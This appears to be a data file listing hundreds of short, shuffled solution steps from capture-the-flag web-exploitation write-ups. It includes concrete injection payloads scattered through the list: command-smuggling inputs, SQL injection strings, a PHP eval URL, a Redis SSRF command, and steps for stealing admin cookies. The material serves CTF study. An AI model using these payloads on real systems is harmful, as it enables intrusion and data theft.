    "Confirm the successful staging of the attack.",
    "Set up a redis server.",
    "Note certain cookies are required.",
    "Got authenticated as 'flagman69'.",
    "GET the page",
    "Recognized that the '/flag' endpoint is case sensitive.",
    "Found that the data are structures that contain all the RGB values for pixels.",
    "Identify a scoped style attribute.",
    "Identified that the File Descriptor (FD) for MySQL server connection is open before shellcode execution.",
    "Mutable namedtuple assignment raises AttributeError.",
    "Set the 'Content-Type' as 'application/json'.",
    "Identify the '/queue' WebSocket endpoint.",
    "Observe the result of the exploit leading to '/etc/passwd'.",
    "Decode the base64 response",
    "Fetch the missing git objects from the server.",
    "Recreate the scenario where 'name' variable is never redeclared.",
    "Identify hashes that start with the '0e' prefix.",
    "Recognized second flag hidden in express endpoint /api/true-answer accessible only from localhost.",
    "Input the payload '; ls #'.",
    "Caused Apache2 to crash due to ':' in directory name.",
    "Opened the CTF challenge.",
    "Wait for a few seconds for the puppeteer instance to start and load the page.",
    "Navigate to /flag",
    "Noticed similarity to previous Drobots challenge.",
    "Note that messages were not being escaped.",
    "Extract data from the server.",
    "Inject the base64 version of the bash script.",
    "Verify the user data.",
    "Attempt to execute the 'cat ../flag.txt' command.",
    "Execute the brute force PHP script",
    "Understood that objects are converted",
    "Notice the challenge is about Cross-Site Scripting (XSS).",
    "Analyze verifyUsername() and find the simple string comparison indicating the correct username to be 'D0loresH4ze'.",
    "Retrieve the flag from the server response",
    "Perform code analysis",
    "Access the URL",
    "Understand that this keylogger sends each pressed key to an external server as an encoded message.",
    "Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
    "Make a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0.",
    "Locate the 'get_comments' function within the [loaddata.py](loaddata.py) file.",
    "Suspect that a reverse proxy might be stripping the X-Forwarded-For header.",
    "Use `python3 solve.py` to exploit the Local File Inclusion (LFI) vulnerability.",
    "Accessed the meme generator web application",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called",
    "Dumped the database.",
    "Leak data byte-by-byte by hashing it and using as password for new account",
    "Passed a random value on the endpoint.",
    "Execute the curl command to send the payload to the server.",
    "Sent the payload to the challenge webpage URL using a POST request",
    "Use Python scripting to manipulate the PDF files.",
    "Signed up on the website.",
    "Used a known attribute in the object",
    "Attempted XSS payloads.",
    "Identified notable shell script 'findaas' inside '/ctf'.",
    "Achieved access to the login page.",
    "Use the factorization of 1337 (7*191) to create the first payload",
    "Use a length of '32 bytes' for the payload",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Remove unwanted characters from the decoded message.",
    "Identify Shellshock vulnerability",
    "Realized 'echo exec(...)' only returns the last line of the output.",
    "Choose reading another HTTP GET parameter.",
    "Observe the website returning a code",
    "Found a public key in the `/robots.txt` file.",
    "Reinspect the source code with attention to the user authentication process.",
    "Set permissions of the 'id' file to 777",
    "Analyze SecretGenerator.Java.",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Waited and read the response as it came in.",
    "Examined the source code of the challenge present in the cloned repository.",
    "Recognize that all open HTML tags '<' have been removed.",
    "Investigate the source code provided.",
    "Sign the Flask cookie with the desired username to authenticate as 'root'.",
    "Exploited the discovered vulnerability",
    "Change the HTTP method to POST.",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Use the directory listing to identify a 'print-flag' file.",
    "Inspect the source code of the website.",
    "Discover plan of attack involving creating a new script tag.",
    "Connect to http://ctfchallenges.ritsec.club:4000.",
    "Identify the 'isAdmin' field within the 'User' model.",
    "Specify the URL for the exploit",
    "Identify leaks of bash history in the logs.",
    "Add the JSON payload to the URL after the first '?' character.",
    "Customize the request body.",
    "Understand that the Origin request header cannot be modified by JavaScript.",
    "Visit 'http://web.zh3r0.ml:7777/?page=flag'",
    "Identify the presence of 'index.php' file in the results.",
    "Concluded that they seemed to be MD5 hashes",
    "Notice the 'Server' header in HTTP response.",
    "Increase the sleep time between requests",
    "Note that the server checks the X-Forwarded-For header to validate the client IP.",
    "Discovered the possibility of using an oracle.",
    "Fetch data using the manipulated query.",
    "Attempt to send this information to a remote server.",
    "Access the webpage.",
    "Understand that customer eligibility is based on fame and point history.",
    "Inspect the source code.",
    "Acknowledge that the challenge involves bypassing origin check",
    "Sent the POST request",
    "Compile the binary.",
    "Check for HTML input acceptance.",
    "Confirm the presence of blind SQL injection.",
    "Identified an Insecure Direct Object Reference (IDOR) vulnerability due to the absence of ownership verification during file requests.",
    "Noticed command execution based on the URL parameter, 'host'.",
    "Locate the captcha boxes on the screen",
    "Smuggle a request to the backend application.",
    "Submit the 'modified.odt' file with the payload to the server as a file upload.",
    "Use 'os.StartProcess' instead.",
    "Inspect the decoded JWT.",
    "Identify the 1st command-line argument used as a value assigned to a macro",
    "Search for the flag.",
    "Experimented with each method.",
    "Understand that any other sha1 hash starting with the same prefix will match the target.",
    "Use only the first five elements of the array to create the file name",
    "Find the 'subprocess.Popen' class.",
    "Recognize the need to rearrange password.",
    "Find the flag by testing one more exploit.",
    "Verify that the identified web application allows file uploads and conversions.",
    "Decode the session data from the cookie using Base64 decoding on a site like cyberchef.",
    "Access the given URL",
    "Recognized that /api is mapped to /.",
    "Determine the position of the (subprocess.Popen) class, which is 407",
    "Replace 'admins' with '.env' in the route.",
    "Sent a curl request",
    "Use the Promise to try and load a URL.",
    "Define a template for the final PDF files.",
    "Access the link 'http://35.207.189.79/pyserver/server.py'.",
    "Analyzed the source code for potential flaws",
    "In each iteration, the author forms SQL Injection payload.",
    "Append '#' at the end of the 'fqdn' to make the final URL your public IP address.",
    "Find the flag file 'flag.jpg'.",
    "Compose a POST request for the server's login endpoint.",
    "The introspection query returns all the content of a graphql schema.",
    "Identify that cookies are set to prevent XSS for all API endpoints.",
    "Develop a Python script to automate the brute-forcing of characters.",
    "Inspect the visible scripts",
    "Understand that the script validates the origin and ID of the message",
    "Check if the history length is three.",
    "Execute 'id' command",
    "Used shell access to browse the file system.",
    "Verify the output reflected in the `style.css` file.",
    "Identified a misconfiguration in the `apache.conf` file.",
    "Understand the list of blocked keywords/functions in the source PHP code",
    "Open the website in a web browser",
    "Executed a HTTP GET request",
    "Created an attacker server.",
    "Use the final URL.",
    "View the source code of cookie.php",
    "Discover that the application is a PHP proxy.",
    "Recognized the Mechanism `ApiMapper` in `poll.dart`.",
    "Review corresponding documentation for mitigation strategies.",
    "Utilized the PHP serialize() function.",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Test the payload to ensure it works.",
    "Determine that the challenge requires interaction with a Flask application.",
    "Accessed the web application.",
    "Wrote a script using 'setTimeout' function.",
    "Verify that the 'language' parameter is indeed changed to 'flag.txt'.",
    "Identify prototype pollution vulnerability",
    "Identify the password field as the entry point for bypassing authentication",
    "Identify that a new CAPTCHA is generated.",
    "Trigger command execution in the create_thumb function.",
    "Retrieved the flag from the table content.",
    "Identify additional server check constraints",
    "Triggered the command execution on the server side",
    "Search for the flag within the server response.",
    "Looped through each camera location in the shapefile",
    "Investigate the HTML code of the website.",
    "Identified the 'data-last' attribute of the '#note-text-area' element.",
    "Confirm the existence of XSS vulnerability at a specific URL.",
    "Use iterative deepening",
    "Test the SQL injection vulnerability.",
    "Understand that a valid signature is needed to exploit RCE",
    "Created a UNION SQL operation with 'null'.",
    "Verify if the count returns 1.",
    "Dumped data from 'startup_users' table by using the SQL query and concatenating usernames using the GROUP_CONCAT function.",
    "Identify potential for XSS due to unescaped output upon viewing uploaded documents",
    "Understand how the application works and what needs to be exploited.",
    "Inspect the downloaded file and find a GitHub URL.",
    "Executed another HTTP request to extract the content of the 'whatsthis' table.",
    "Design the script to automate the trial and error process",
    "List directory content remotely using the identified class",
    "Crafted payload '/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>'.",
    "Noted SQL errors",
    "Detect open debugging ports.",
    "Try various inputs.",
    "Enter the URL 'overly.uniquename.xyz:2095'.",
    "Write a script to bruteforce each of the hardcoded cookie names.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Realize that the file 'flag.jpg' was later removed.",
    "Use the information obtained from the previous step.",
    "Identified the opportunity for a PHP Object Injections vulnerability.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Develop script for indexing and reconstucting.",
    "Inject the command '127.0.0.1; ls -al' into the IP address field.",
    "Inserted HTML through 'preview' feature.",
    "Decided to leak the database name.",
    "Form the flag",
    "Send the payload 'url=inctf://redis:6379/_SET <userID>_isAdmin \"yes\"'.",
    "Approach the third 'If' statement",
    "Understood that the variable part contained the actual char of the flag.",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint.",
    "Observe that comments under a picture can be inserted.",
    "Find a way to bypass the remaining check.",
    "Tried to bruteforce the admin portal without success",
    "Suggested that unsanitized 'shell_exec' function allows for potential shell command exploits.",
    "Obtain the flag through the execution of solve.py",
    "Include 'Transfer-Encoding: chunked' header in the request.",
    "Decide to control the 'window.name' variable.",
    "Redirect the browser using the `Location` header.",
    "Injected the exploit into the 'login' cookie.",
    "Visit the target website.",
    "Fooled HAProxy into treating the request body as part of the first request.",
    "Observed the HTML interface for writing and saving notes.",
    "Contain the password.",
    "Review the error received.",
    "Execute the query '123' UNION SELECT flag, null, null from more_table;--'.",
    "Recognize the usage of GET request arguments",
    "Decide to add custom JavaScript code to the 'code' key",
    "Identify the existence of a WebSocket tunnel from the 'HTTP/1.1 101 Switching Protocols' packet.",
    "Set 'X-Forwarded-For' to every IP in the range 172.16.2.0 to 172.16.2.255.",
    "Increase loyalty point history minimum of 1337 times.",
    "Receive a server response containing the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Noticed that the 'salt' and 'hash' values are extracted from the JSON request body",
    "Note that comma separation is added between each element of the array in the string format",
    "Find a flag in the profile of dennisb@uupeye.edu",
    "Explored potential SQL Injection through string manipulation.",
    "Submit the input.",
    "Enumerated permissions using 'enumerate-iam' tool",
    "Started interacting with the Firebase installation using the browser console.",
    "Found a `token` cookie.",
    "Identify a potential PHP deserialization vulnerability in cookie.php",
    "Receive an error message indicating pumpId was missing.",
    "Experiment with the '/getFile?file=...' route.",
    "Defined final payload using 'wget' and command substitution.",
    "Looked for potential Apache Tomcat vulnerabilities.",
    "Examine the source code of the page",
    "Initiated a network scan using Nmap",
    "Identified that 'Cheap' can be bought by entering a valid credit card.",
    "Performed parameter pollution on the frontend with 'GET /callback?user=FRONTEND_USERNAME&amount=1337&amount=0&nonce=NONCE&sig=SIGNATURE'.",
    "Analyzed the error message and deduced that a Python Flask backend is used",
    "Set up a remote server for this purpose.",
    "Identified that 'transmissions' had a variable part in the middle.",
    "Send a POST request to upload the created file.",
    "Found an interesting comment in the HTML source code: '?sauce'.",
    "Execute the script to obtain the CTF flag.",
    "Went to the '/tmp' directory",
    "Observe the uploaded file triggering a POST to /upload.php.",
    "Found that the document contained the lyrics of a song and the required flag.",
    "Change the value of the 'admin' field to 'true'.",
    "Write PHP payload to '/tmp/pwn.php'.",
    "Confirmed the use of SQLite version 3.22.0.",
    "Investigate the site.",
    "Trigger the 'window.open' function with the payload",
    "Access the '/admin' directory.",
    "Encode the payload to base 64.",
    "Analyze the HTML response.",
    "Attempted to use ' in the username parameter.",
    "Aim to reset the admin's 2FA code through the POST request.",
    "Retrieved the flag from the table content.",
    "Identify vulnerability in '/api/tet/list' endpoint.",
    "Add the encoded payload to the URL.",
    "Understand that the challenge involves investigating an unintentionally exposed internal API and finding a flag.",
    "Find commit IDs within the log.",
    "Proceed with user registration.",
    "Determine attacking strategy.",
    "Set the GET parameter to '?print=echo+'';print(eval('return ${blocked}[4](${nc});'))'",
    "Conduct experiments with uploading images.",
    "Encode the malicious payload in base64",
    "Note that the server response includes the author of the feedback.",
    "Identify the constraints: the payload must be less than 30 characters and cannot contain 'zer0pts'.",
    "Sent the payload to the server.",
    "From previous knowledge and references",
    "Repeat the process for characters in each WebSocket packet.",
    "Noted the usage of the Python script to generate CSS.",
    "Reveal running as 'www-data'",
    "Understand that the usage of 'localhost:3000' origin avoids the Same Origin Policy",
    "Analyze the provided PCAP file",
    "Observe availability of admin button.",
    "Check if the page content contains 'MCA{'.",
    "Noticed that user cookie is double base64 encoded",
    "Noted that the post is only visible to the admin.",
    "Note the comparison $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Duplicate the server environment.",
    "Typed the URL 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce' in the web browser and visited the webpage.",
    "Note the session info",
    "Realized that Chrome DevTools can be used for debugging and obtaining the required information.",
    "Realized the page contained some secret potentially usable code.",
    "Created an 'id' file with the malicious payload",
    "Identify the list of banned words and special characters that the injection string must not contain.",
    "Configure a grep match for 'flag{' to locate the start of the flag.",
    "URL encoded the second binary string.",
    "Take note of the 'username' from the form inputs.",
    "Find a potential Off-by-Slash bug.",
    "Uploaded a PHP file to the server.",
    "Recognize the presence of an SQL Injection vulnerability",
    "The characters from the 'domain' are progressively appended to the payload.",
    "Figured out the need of a passcode to perform admin functions.",
    "Observe the output of the \"CONFIG\" log.",
    "Plan to send requests containing SQL to the server.",
    "Understand that gaining a shell inside the docker container could provide more privileges.",
    "Updated the CSS in the redeployed page.",
    "Command injection became possible",
    "Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Perform an XS leak attack.",
    "Index characters of 'P4s5_w0Rd' string.",
    "Select any one of the identified hashes.",
    "Understand the information as a hint towards 'robots.txt'",
    "Look into how PHP removes whitespaces from input parameters' names.",
    "Uncover the checkpoint creation by tar utility.",
    "Discover files in the directory, including the 'flag' file, amongst others.",
    "Connect to the website at http://10.255.0.1:8010/",
    "Used the following payload: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #.",
    "Identify the 'User' model within the file.",
    "Examine the `readflag` binary.",
    "Developed a payload utilizing 'x:script' to exploit the vulnerability.",
    "Send the request with the cookie to the intruder.",
    "Plug in a modified payload with a long sequence of directory traversal in the URL.",
    "Find default Apache2 installation page",
    "Modified '$mfa_token' to reference '$_correctValue' attribute.",
    "Run the exploit with the specified phar file",
    "Observe that the decoded value of 'admin' is 'false'.",
    "Attempted to login with 'admin', 'admin' as username and password.",
    "Manually modify the 'Link to profile' field",
    "Download the source.zip file.",
    "Find the flag inside the newly public gallery.",
    "Review the given source code, which is a Javascript calculator web app.",
    "Access the provided source code and link to the running instance.",
    "Identify and exploit vulnerabilities present in the Apache server.",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter.",
    "Set up a `ngrok` TCP forwarder.",
    "Use the identified class (subprocess.Popen) to execute the 'id' command",
    "Experimented with `1' ORDER BY` commands.",
    "Navigate to the '/checkbalance' endpoint with the queried amount.",
    "Bypass '\\' by constructing a string.",
    "Injected the crafted payload into a request in either the top text",
    "Identify the URL parameter labelled 'flag'",
    "Analyzed the HTML source code.",
    "Noted that admin reads these HTML files",
    "Generate a webpage with the XSS payload.",
    "Identify the server's functioning port and host from the extracted main execution function.",
    "Log into the application",
    "Authenticate successfully.",
    "Take note that the flag is represented as 'SharifCTF{MD5(lowercase(Hello_Rules))}'",
    "Observe that only certain attributes are allowed for an element in the JavaScript code.",
    "Attempt to checkout the master branch.",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes",
    "Note the limitation of '36 characters' for the 'uuid' parameter",
    "Verify that the accessor for 'key' has been overridden and behaves as expected.",
    "Identify the received flag as a cookie in the HTTP GET request",
    "Submit the same payload multiple times.",
    "Click on the 'simple quiz' link or button to navigate to the quiz section.",
    "Submitted final payload that contained a script.",
    "Start the instance.",
    "Enable running the `readflag` binary using the bind shell.",
    "Recognize that the 'with' HTTP GET parameter can be manipulated.",
    "Obtain the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "Use the XML External Entity vulnerability to call the disguised phar file.",
    "Scanned the 'flag_db' DynamoDB table",
    "Checked for possible exploitations in the Java Servlet.",
    "Download app.py",
    "Constructed the POST request with 'user' and 'pass' parameters",
    "Identify the method of generating the encryption key.",
    "Examine the `decrypter` function",
    "Succeed in accessing localhost on the URL capture service",
    "Observe that the server reflects the passed productId value in the response.",
    "Make a request to /flag using the new admin JWT token.",
    "Test the character '+'",
    "Note the blacklisted characters.",
    "Display the content of the flag.txt file",
    "Analyse the challenge",
    "Aim to steal the VIP user's cookies.",
    "Include the Base64 encoded data as part of the request payload.",
    "Realized that 'process.env.npm_execpath' can be controlled.",
    "Recognize that it opens up path traversal vulnerabilities.",
    "Submit the form with random user credentials",
    "Pass the decoded cookie to the 'app.render' function",
    "Checked if both md5 hashes matched.",
    "Understand that a 'Requests_On_Steroids' function is used for POST request.",
    "Successful bypass of all server checks",
    "Confirm the successful exposure of the /etc/passwd file.",
    "Repeat the previous substep 4 more times",
    "Find the hint related to cookie value matching MD5 hash of '$cfg_pass' variable",
    "Repeated the Javascript injection to fetch the flag.",
    "Detect if a scroll occurred when a text fragment is parsed in the URL.",
    "Discover that the chat functionality was vulnerable to HTML tag injection.",
    "Receive an error message that the IP address was not in the whitelist.",
    "Realized this could lead to unreplaced `<` and `>` characters.",
    "Observe a page that accepts another URL and submits it.",
    "Craft a malicious Java serialized object with a large 'value' to speed up the process",
    "Start searching each revision.",
    "Download the source code attached to the CTF challenge.",
    "Bruteforced the flag letter by letter.",
    "Downloaded the required files as outlined by the 'bzr check' error message.",
    "Confirmed no intentional vulnerabilities within the files.",
    "Observe that the application is behind AWS ELB.",
    "Create a working script",
    "Note the reference to a potentially fake flag",
    "Send the command 'SET <userID>_isAdmin \"yes\"'.",
    "Print response from the server using command r.text.",
    "Retrieve the value of the content attribute from the identified meta tag.",
    "Recover the missing source files using Bazaar's 'revert' command.",
    "Create a Python script to automate the process.",
    "Examine the cookies in the HTTP request.",
    "Review the site's JavaScript.",
    "Identify a comment prompting the user to 'get the page'",
    "Note the hint regarding the character set.",
    "Verify that the post content is printed with 'self.__dict__' in the preview of the webpage.",
    "Enter the password 'admin'",
    "Fetched the flag.",
    "Successfully created an admin account.",
    "Observe the HTTP response header",
    "Observed that the prefix changed in the unsuccessful purchase.",
    "Extract the main execution function from the Python script.",
    "Trigger the browser to fetch the attacker-controlled site's root path, '/' with the cookie value appended.",
    "Notice that a 'note' is 'found' if it starts with 'request.search'.",
    "Identify that the flag is in the same database as the toys, but its approved value is set to 0.",
    "Understand the interpretation of the GET call.",
    "Execute the first successful exploit.",
    "View the source code of authentication.php",
    "Identified the input.",
    "Observed that the source code of the site became visible.",
    "Realized that the search function checks if a given fragment identifier substring is part of the flag.",
    "Discovered that the python pickle can be prepended with '!'",
    "Identify that the web application is using 'ejs'.",
    "Note the inclusion of regex functionality.",
    "Notice the usage of a vulnerable version of the Python Pillow library.",
    "Found a commented information indicating possible internal IP and an endpoint for admins.",
    "The Angular application was set up behind an Nginx reverse proxy.",
    "Used 'Redirect 307' to read arbitrary files.",
    "Discover a JavaScript code that copies the email value to the username field.",
    "Discover PHP form for var1 and var2.",
    "Break the loop.",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method",
    "Performed a HTTP GET request",
    "Plan to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Leverage the assumption that a POST request might be needed.",
    "Notice an option to register a new account.",
    "Confirmed the malicious 'id' could be run as root",
    "Received a 'HTTP 403 Forbidden' error, suggesting the '.bzr' directory's presence.",
    "Set a breakpoint at the desired location",
    "Observed reflection of the input into an XSL document.",
    "Recognized that 'this.noteData' remained the same after sanitization.",
    "Exfiltrated each character using the updated CSS.",
    "Implement research knowledge.",
    "Researched what IIFE (Immediately Invoked Function Expression) is",
    "Had the right PHPSESSID in cookies.",
    "Pass serialized input via 'id' HTTP GET parameter",
    "Polluted 'npm_config_global' to a truthy value.",
    "Create two user accounts",
    "Observe the text of the challenge that refers to 'robots'.",
    "Access the index 258",
    "Remove the loop() function from addCaptcha()",
    "Demonstrate successful Remote Code Execution (RCE)",
    "Assign the value 'true' to the cookie.",
    "Used Burp Suite Intruder scan.",
    "Try to access the admin panel of the website.",
    "Set the loop condition to run until the password is fully determined using the SQL Injection.",
    "Find the API used to modify the status of the services.",
    "Recognized the string as representing the flag",
    "Detect SQL injection vulnerability on INSERT statement",
    "Consider using a tool like singularity to set up a DNS server.",
    "Observed that there is a proxy server and a backend server accessible at provided URLs.",
    "Examine the render function",
    "Evaluated the structure of the 'books' table.",
    "Visited the website.",
    "Leveraged the server's behavior of following redirects.",
    "Complete the payload.",
    "Checked the webpage source",
    "Examine the provided back-end source code.",
    "Tried a wrong HTTP verb.",
    "Locate where 'store.key' is defined using 'crypto.randomBytes'.",
    "Find a box inside the admin panel.",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "The code manages a market API.",
    "Caused the source of 'flag.php' file to be revealed",
    "Exported '/tmp' to the PATH",
    "Infer that Chrome is used for rendering JavaScript.",
    "Access the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt.",
    "Note that the Go microservice uses the Beego web framework",
    "Read and retrieve the flag from the displayed contents.",
    "Locate the POST requests to '/login.php'.",
    "Look at the JavaScript file in the webpage.",
    "Analyze 'calc.js'",
    "Find the blog post page '?p=1'.",
    "Adjust necessary parameters in the python script.",
    "Note the returned HTML",
    "Created another loop in the Python script.",
    "Observe the form to fill.",
    "Observed that .htaccess extension is allowed.",
    "Understand the concept of exploiting object injection by inserting custom objects into user data, thus altering protected attributes and evading authentication.",
    "Compose PHP code to generate the custom objects (`Login`, `User`, `SQL`). The custom `Login` object encompasses the custom `User` object and the `$_correctValue` reference. The custom `User` object encompasses a customized `SQL` object with the custom `$query`.",
    "Logged back in with escalated privileges.",
    "Made the decision to overwrite '.bashrc' file",
    "Execute '/bin/sh' with an argument to read the flag file and redirect the output to '/tmp/jizz'.",
    "Identify the app as written with Next JS.",
    "Print contents of 'flag.file'",
    "Obtained the flag.",
    "Receive a QR code of the letter 'X'.",
    "Script composes the flag.",
    "Investigated the responses received.",
    "Identified the dependencies 'md-to-pdf' and 'nunjucks' in the 'package.json' file.",
    "URL-encode the payload again.",
    "Recognize that the challenge involves exploiting a page to pop up an alert.",
    "Identify weak point in code",
    "Attempt command injection.",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Generate payloads with the SQL query to extract each character of the token",
    "Consider using a domain starting with localhost, such as localhost.zeyu2001.com.",
    "Set up a server using the `nc` command to listen for admin cookies",
    "Add 'account[role]' parameter with value 'admin'.",
    "Craft AJP Requests to be sent using Request Smuggling.",
    "Retrieved the flag.",
    "Search for 'vulnerability' in the GitHub repository's Issues",
    "Inject the SQL Injection payload into the username field.",
    "Set the 'isAdmin' field to 'true' in the request body.",
    "Receive 400 error response for the first GET request.",
    "Discover two exploits related to the 'Modern events calendar' plugin.",
    "Find a formula",
    "Notice that the resources are fetched from '/ajax/articles?cat=news'.",
    "Identify serialization in the php code.",
    "Generate a custom wordlist of potential log file names.",
    "Access the source code of the web app.",
    "Understand that the port scan needs to be completed before the browser instance is closed.",
    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Make a GET request with a 'Range' HTTP header to exfiltrate the original /secret.html page.",
    "Send the encoded payload through the cookie header.",
    "Analyze the websockets packet structure",
    "Craft a payload.",
    "Observe the information revealed about the file structure.",
    "Determine the payload to be inserted.",
    "Use an extractor tool.",
    "Used DOM Clobbering technique",
    "Observed the usage of 302 server-side redirect to '/view' for a matching note.",
    "Retrieve the flag from file content",
    "Construct a command.",
    "Use 'request.args' to bypass banned characters.",
    "Analyzed the results from the SQLmap.",
    "Hidden sheet gets added to the panes",
    "Noticed that three successful purchases of 'cheap' had the same prefix.",
    "Determine that the website is a Flask application.",
    "Users were redirected to '/callback' on the frontend application.",
    "Find a 'token' key in the cookies",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root.",
    "Put together all obtained parts of the flag.",
    "Create final payload using all the methods of bypassing and injecting discovered.",
    "Observe the possibility of redirection to '/' depending on the user's balance.",
    "Understand that a JavaScript Immediately Invoked Function Expression (IIFE) can be used for RCE.",
    "Implemented the UNION based SQL Injection",
    "Type a random base username and password for the login.",
    "Observe allowed actions: upload and comment on dog pictures.",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Used the admin's cookies to visit 'private.php'.",
    "Cause the checkpoint action to be executed by exceeding 10 records.",
    "Accessed files such as '.git/HEAD'",
    "Enter 'Stoney' for Mother's Maiden Name",
    "Exploit the XSS vulnerability to send a POST request.",
    "Set the value of the header 'answer' as 'Fear the Old Blood'",
    "Accessed the '/cornelia' URL.",
    "Discover a comment in the HTML source code referencing a potential vulnerability using TOTP",
    "Server returned all allowed methods.",
    "Used wordplay in the answers.",
    "Given the /request endpoint from challenge.",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Enter blank input enclosed in two apostrophes in the username field.",
    "Recognized that the `/api/flag` endpoint is fetched using `postRequestWithCookies`.",
    "Extracted the challenge flag from the server response.",
    "Discover the variable name 'application' linked to the tornado.web.Application object.",
    "Select and observe the local storage.",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin'",
    "Send POST request to upload the generated file.",
    "Inside the new HTML script element, decide to add an 'imports' key",
    "Run commands and increase the command output slice index until the result was empty.",
    "Visit the website.",
    "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Executed HTTP POST request to the target server.",
    "Added debug prints to the file for the GET path",
    "Used directory traversal (../) to access the flag",
    "Obtain table names from information_schema.tables",
    "Discovered that the website is using PHP eval() function.",
    "Identify the first exploit.",
    "Found that an error was thrown.",
    "Visit the source URL provided for the challenge.",
    "Find a section in DOMPurify's unit tests.",
    "Understand each book's URL structure on server.",
    "Visit the '/admin' route.",
    "Break the infinite loop.",
    "Receive a 'Not Found' error",
    "Examined the index.php.",
    "Initiate exploitation",
    "Log into the admin account.",
    "Run grep command to search for unusual text.",
    "Determine the vulnerable parameter as 'galleryUrl'.",
    "Restructure the query to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'.",
    "Open cURL.",
    "Recognize the location of the 'send_sms' function in 'sms.py'",
    "Flag found: 'OOO{did you see my dog}'.",
    "Realize that a hidden sheet's full range can be accessed",
    "Added the id=like to the injected 'a' tag.",
    "Test the final URL.",
    "Suggest to visit recently acquired companies.",
    "Search for the flag within the script's output.",
    "Tried the previously discovered SQL injection, found that it still works",
    "Note that a remote debugging port is exposed.",
    "Meet the condition in the JavaScript code by running a payload such that it equals 1337",
    "Noticed a website related to the challenge.",
    "Used `1'; USE information_schema; SHOW TABLES;`.",
    "Executed the 'dig' command on 'asdf.jsapi.tech'.",
    "Locate the admin cookie.",
    "Caught the request including the Admin-Key on our own server.",
    "Identified a `/flag` endpoint.",
    "Try to generate 'oauth tokens' for the flag note.",
    "Observed the server using 'Content-Length' header.",
    "Discover '?lmao' in the robots.txt file",
    "Determined that sending a GET request with 'source' as a parameter reveals the source code.",
    "Attempted to mutate the element in order to bypass the sanitizer.",
    "Recognize that this can be exploited for login.",
    "Para meters and values such as 'domain', 'check', 'key', and 'column' are initialized.",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me'.",
    "Run the script.",
    "Extract the flag from the Admin Bot's cookies.",
    "Discover the flag within the source code.",
    "Connect to the provided URL",
    "Determine that the second part of the packet represents the post ID",
    "Realize that the GET handler for '/localisation-file' allows the reading of arbitrary files.",
    "Observe the authentication response for a nonexistent user",
    "Open the webpage in a web browser",
    "Use interp to evaluate Golang at runtime from cookie.",
    "Noted that most common PHP file extensions are blocked.",
    "Inspect the decoded payload.",
    "Accounted for the replace operation which changed the string length.",
    "Use the browser or curl to navigate to the site's main page.",
    "Recognize `ejs` as a library used for templating in web applications.",
    "Study the game",
    "Open the link 'very.uniquename.xyz:2052'",
    "Recognize that blind NoSQL injection is required.",
    "Deduce the purpose of the '$ne' filter.",
    "Formulate the payload in the format 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'.",
    "Confirm vulnerability using the uploaded LaTeX document",
    "Embed the 'id' of the attacker's user in the request body.",
    "Find a 'follow' button on the admin's profile.",
    "Indicate the successful execution of the attack.",
    "..by inputting ' OR 1=1--'",
    "Use the URL 'http://35.207.189.79/api/login'",
    "Send POST requests with a payload that uses the SQL LIKE clause for each possible character.",
    "Determine that the website is an online calculator",
    "Hosted the payload on an external website",
    "Triggered an email with the flag as content",
    "Check the docker configuration file.",
    "Observe the website redirection to '/flag'",
    "Execute the RS256-to-HS256 exploit using python3 jwt_tool.py.",
    "Identify the exposed '.git' directory",
    "Observe that JavaScript inside the uploaded HTML does execute.",
    "Create a phar file",
    "Input {{ state }}",
    "Utilize the network tab in the browser's developer tools.",
    "Capture the flag.",
    "Perform a command injection.",
    "Identify the relevant classes and methods used for authentication.",
    "Construct the backend endpoint as '$BACKEND/get/5779715767432985082/../../admin'.",
    "Discover the PHP sessions are file-based.",
    "Tried to enumerate DB tables.",
    "Open the target URL",
    "Inspect the webpage",
    "Recognize that 'urllib.parse' was updated to strip newline characters.",
    "Run the binary inside the docker container.",
    "Examine the source.zip file.",
    "Conducted further research on 'nunjucks'.",
    "Read the 'flag.txt' file using the root shell",
    "View the code of 'index.php' file.",
    "Identify the service.",
    "Find the flag",
    "Scanned each discovered username for potential files associated with them.",
    "Connect to 'scriptlet' endpoint",
    "Recognize the challenge in exploiting the vulnerability",
